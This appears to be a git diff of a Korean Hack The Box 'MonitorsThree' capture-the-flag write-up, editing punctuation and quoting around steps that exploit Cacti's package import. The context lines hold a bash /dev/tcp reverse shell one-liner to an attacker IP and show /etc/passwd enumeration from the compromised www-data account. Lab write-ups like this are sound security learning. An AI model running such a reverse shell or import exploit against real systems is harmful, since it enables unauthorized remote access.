@@ -189,7 +189,7 @@ $ ls -l test.xml.gz
 -rw-rw-r-- 1 kali kali 1165 Mar  9 04:43 test.xml.gz
 ```
 
-`cacti.monitorsthree.htb` 에 돌아온 뒤 **Import Packages** 메뉴로 이동하였다. 이후 생성한 `test.xml.gz` 패키지를 업로드한 뒤 **Import**를 수행하였다.
+`cacti.monitorsthree.htb` 에 돌아온 뒤 **Import Packages** 메뉴로 이동하였다. 이후 생성한 `test.xml.gz` 패키지를 업로드한 뒤 **Import**를 수행하였다:
 
 ![MonitorsThree](/assets/htb-linux/monitorsthree/import.png)
 
@@ -224,7 +224,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.75/9001 0>&1'
 현재 시스템에서 로그인 가능한 사용자를 확인하기 위해 `/etc/passwd` 파일을 확인하였다:
 
 ```bash
-www-data@monitorsthree:~/html/cacti/resource$ grep "sh$" /etc/passwd
+www-data@monitorsthree:~/html/cacti/resource$ grep 'sh$' /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
